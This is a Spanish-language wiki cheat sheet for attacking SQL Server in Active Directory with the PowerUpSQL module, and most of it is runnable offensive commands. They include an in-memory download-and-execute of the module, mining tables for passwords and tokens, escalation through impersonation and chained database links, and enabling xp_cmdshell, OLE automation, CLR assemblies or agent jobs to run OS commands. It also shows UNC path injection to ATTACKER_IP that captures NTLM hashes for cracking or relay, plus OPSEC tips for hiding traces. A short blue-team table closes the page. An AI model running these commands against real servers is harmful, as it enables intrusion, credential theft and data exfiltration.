---
title: "PowerUpSQL Cheat Sheet"
category: "AD"
description: "Herramienta para descubrir, auditar y escalar privilegios en servidores SQL Server dentro del dominio."
image: "/images/wiki/3.png"
---

# PowerUpSQL: Escalada de Privilegios en SQL Server

**PowerUpSQL** es un módulo de PowerShell de [NetSPI](https://github.com/NetSPI/PowerUpSQL) para descubrimiento, auditoría y explotación de instancias SQL Server en entornos Active Directory. SQL Server es un objetivo de alto valor porque:

- Las cuentas de servicio suelen tener privilegios elevados en el dominio.
- Los **Database Links** encadenan acceso entre servidores, incluso cruzando confianzas de bosques.
- Un `sa` (sysadmin) equivale a ejecución de comandos como la cuenta de servicio del motor.
- Las instancias se registran como SPN en AD, facilitando su descubrimiento sin escaneo de puertos.

## Instalación e Importación

```powershell
# Descarga directa en memoria
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1')

# Importar desde disco
Import-Module .\PowerUpSQL.ps1
```

## Descubrimiento de Instancias

### Vía Active Directory (SPN)

Consulta los Service Principal Names en AD. Es el método más silencioso: no genera tráfico hacia los SQL Server.

```powershell
Get-SQLInstanceDomain
Get-SQLInstanceDomain -DomainController dc01.corp.local -Domain corp.local
Get-SQLInstanceDomain -CheckMgmt   # incluye dominios con confianza
```

### Broadcast y UDP

```powershell
Get-SQLInstanceBroadcast -Verbose                                         # subred local
Get-SQLInstanceScanUDP -ComputerName 10.10.10.0/24 -Verbose               # rango de IPs
Get-SQLInstanceScanUDP -ComputerName (Get-Content .\hosts.txt) -Verbose   # lista de hosts
```

| Método | Ventaja | Desventaja |
|--------|---------|------------|
| `Get-SQLInstanceDomain` | Sin tráfico a SQL; usa LDAP | Solo instancias con SPN |
| `Get-SQLInstanceBroadcast` | Rápido en subred local | Limitado a la red local |
| `Get-SQLInstanceScanUDP` | Encuentra instancias sin SPN | Genera tráfico detectable |

## Test de Acceso y Enumeración

```powershell
# Probar conexión (filtrar accesibles)
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose -Threads 10 |
  Where-Object { $_.Status -eq "Accessible" }

# Info del servidor (versión, cuenta de servicio, si eres sysadmin, xp_cmdshell)
Get-SQLServerInfo -Instance "srv-sql01.corp.local,1433" -Verbose

# Bases de datos accesibles
Get-SQLDatabase -Instance "srv-sql01.corp.local,1433" -HasAccess

# Buscar datos sensibles por nombre de columna
Get-SQLColumnSampleDataThreaded -Instance "srv-sql01.corp.local,1433" `
  -Keywords "password,pwd,credential,secret,token" -SampleSize 3 -Verbose
```

## Escalada de Privilegios

### Auditoría y Escalada Automática

```powershell
# Ejecuta TODAS las comprobaciones de escalada
Invoke-SQLAudit -Instance "srv-sql01.corp.local,1433" -Verbose

# Intenta escalar automáticamente explotando debilidades encontradas
Invoke-SQLEscalatePriv -Instance "srv-sql01.corp.local,1433" -Verbose
```

`Invoke-SQLAudit` comprueba: permisos excesivos, impersonación, credenciales en stored procedures, links con privilegios elevados, OLE Automation, CLR habilitado, etc.

### Impersonación con EXECUTE AS

Si el usuario tiene `IMPERSONATE` sobre otro login (p.ej. `sa`), puede ejecutar consultas en su contexto.

```sql
-- Ver qué logins se pueden impersonar
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonar y verificar
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
REVERT;
```

```powershell
# Detección y explotación automática
Invoke-SQLAuditPrivImpersonateLogin -Instance "srv-sql01.corp.local,1433" -Verbose -Exploit
```

## Abuso de Database Links

Los Database Links permiten ejecutar consultas en otra instancia. Los privilegios del link pueden ser mayores que los del usuario (p.ej. link con `sa`). Cuando forman cadenas, el riesgo se multiplica.

### Enumeración y Crawl

```powershell
Get-SQLServerLink -Instance "srv-sql01.corp.local,1433" -Verbose       # listar links
Get-SQLServerLinkCrawl -Instance "srv-sql01.corp.local,1433" -Verbose  # crawl recursivo
```

### Ejecución a Través de Links

```powershell
# Query en servidor enlazado
Get-SQLServerLinkCrawl -Instance "srv-sql01.corp.local,1433" -Query "SELECT @@servername"

# xp_cmdshell a través de la cadena de links
Get-SQLServerLinkCrawl -Instance "srv-sql01.corp.local,1433" -Query "exec master..xp_cmdshell 'whoami'"
```

### OpenQuery Anidadas (Manual)

Para control fino o cuando el crawl automático falla. Cada nivel de anidamiento requiere duplicar comillas simples.

```sql
-- Un salto
SELECT * FROM OPENQUERY("srv-sql02", 'SELECT @@servername');

-- Dos saltos: srv-sql01 -> srv-sql02 -> srv-sql03
SELECT * FROM OPENQUERY("srv-sql02",
  'SELECT * FROM OPENQUERY("srv-sql03", ''SELECT @@servername'')');

-- xp_cmdshell a dos saltos
SELECT * FROM OPENQUERY("srv-sql02",
  'SELECT * FROM OPENQUERY("srv-sql03", ''exec master..xp_cmdshell ''''whoami'''''')');
```

### Habilitar xp_cmdshell Vía RPC Out

Si tienes `sa` en el servidor origen:

```sql
EXEC sp_serveroption 'srv-sql02', 'rpc', 'true';
EXEC sp_serveroption 'srv-sql02', 'rpc out', 'true';

EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [srv-sql02];
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [srv-sql02];
EXEC ('exec master..xp_cmdshell ''whoami''') AT [srv-sql02];
```

## Ejecución de Comandos en el SO

### xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Deshabilitar tras uso (OPSEC)
EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
```

### OLE Automation Procedures

Alternativa cuando `xp_cmdshell` está bloqueado o monitorizado.

```sql
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @output INT;
EXEC sp_OACreate 'wscript.shell', @output OUT;
EXEC sp_OAMethod @output, 'run', NULL, 'cmd.exe /c whoami > C:\temp\output.txt';

EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
```

### CLR Assemblies

Carga código .NET arbitrario en SQL Server. Más potente y flexible.

```sql
EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
-- SQL Server 2017+: desactivar strict security
EXEC sp_configure 'clr strict security', 0; RECONFIGURE;

CREATE ASSEMBLY cmd_exec FROM 'C:\temp\cmd_exec.dll' WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR(4000)
  AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec];
EXEC cmd_exec 'whoami';

-- Limpieza
DROP PROCEDURE cmd_exec;
DROP ASSEMBLY cmd_exec;
```

### SQL Server Agent Jobs

```sql
USE msdb;
EXEC dbo.sp_add_job @job_name = N'test_job';
EXEC sp_add_jobstep @job_name = N'test_job', @step_name = N'exec_cmd',
    @subsystem = N'CmdExec', @command = N'whoami > C:\temp\agent_out.txt';
EXEC dbo.sp_add_jobserver @job_name = N'test_job';
EXEC dbo.sp_start_job @job_name = N'test_job';
EXEC dbo.sp_delete_job @job_name = N'test_job';  -- limpieza
```

## UNC Path Injection (Captura de Hashes)

Fuerza al servidor SQL a autenticarse contra un recurso SMB del atacante, capturando el hash NTLMv2 de la cuenta de servicio. Métodos:

```sql
-- xp_dirtree (no requiere sysadmin, el más común)
EXEC master..xp_dirtree '\\ATTACKER_IP\share';

-- xp_fileexist
EXEC master..xp_fileexist '\\ATTACKER_IP\share\file.txt';

-- xp_subdirs
EXEC master..xp_subdirs '\\ATTACKER_IP\share';

-- BULK INSERT (requiere ADMINISTER BULK OPERATIONS)
BULK INSERT tmpdata FROM '\\ATTACKER_IP\share\data.txt';
```

En la máquina atacante, levantar un listener SMB (`sudo responder -I eth0` o `sudo impacket-smbserver share /tmp -smb2support`) y luego forzar la autenticación:

```powershell
Invoke-SQLUncPathInjection -CaptureIp ATTACKER_IP -Instance "srv-sql01.corp.local,1433" -Verbose
```

El hash capturado se puede crackear con `hashcat` o reutilizar con ataques de relay (`ntlmrelayx`).

## Exfiltración de Datos

```powershell
# Buscar datos sensibles en TODAS las instancias accesibles
Get-SQLInstanceDomain |
  Get-SQLConnectionTestThreaded -Verbose |
  Where-Object { $_.Status -eq "Accessible" } |
  Get-SQLColumnSampleDataThreaded -Keywords "password,secret,credit,ssn,token" -SampleSize 5
```

Para exfiltración vía Database Links, combinar `OPENQUERY` con `INSERT INTO` en un servidor controlado o volcar a ficheros UNC.

## Consideraciones OPSEC

| Acción | Riesgo | Mitigación del atacante |
|--------|--------|------------------------|
| Habilitar `xp_cmdshell` | Alto | Deshabilitar inmediatamente tras uso |
| OLE Automation | Medio | Menos monitorizado, pero deja rastro en el log |
| CLR Assembly | Medio | Eliminar assembly y procedimiento tras uso |
| UNC Path Injection | Bajo-Medio | `xp_dirtree` es legítimo; tráfico SMB saliente puede alertar |
| Database Link Crawl | Bajo | Consultas legítimas; vigilar volumen inusual |
| Agent Jobs | Alto | Borrar job inmediatamente |

Comprobar siempre la política de auditoría (`SELECT * FROM sys.server_audits`) antes de actuar. No dejar features habilitadas tras el uso.

## Detección y Mitigación (Blue Team)

| Vector | Detección | Mitigación |
|--------|-----------|------------|
| `xp_cmdshell` | Evento SQL Audit, cambio en `sp_configure` | Deshabilitar y alertar sobre cambios de config |
| OLE Automation | SQL Audit, monitorizar `sp_OACreate` | Deshabilitar si no es necesario |
| CLR Assembly | Auditar `CREATE ASSEMBLY`, `sys.assemblies` | `clr strict security = 1` (2017+) |
| Database Links | Auditar `sys.servers`, revisar permisos | Mínimo privilegio; nunca configurar con `sa` |
| UNC Path Injection | SMB saliente desde SQL Server | Bloquear SMB (445) saliente desde servidores SQL |
| Impersonación | Auditar `EXECUTE AS`, permisos `IMPERSONATE` | Revocar permisos innecesarios |
| Cuentas de servicio | Kerberoasting del SPN | Usar gMSA con contraseñas largas y rotación |

## Entradas Relacionadas

- **Kerberoasting**: las cuentas de servicio de SQL Server con SPN son candidatas a Kerberoasting.
- **NTLM Relay**: los hashes capturados vía UNC injection se retransmiten con `ntlmrelayx`.
- **BloodHound**: visualiza rutas de escalada desde cuentas de servicio SQL en AD.
- **Mimikatz**: si se obtiene shell como cuenta de servicio, extraer credenciales del proceso.
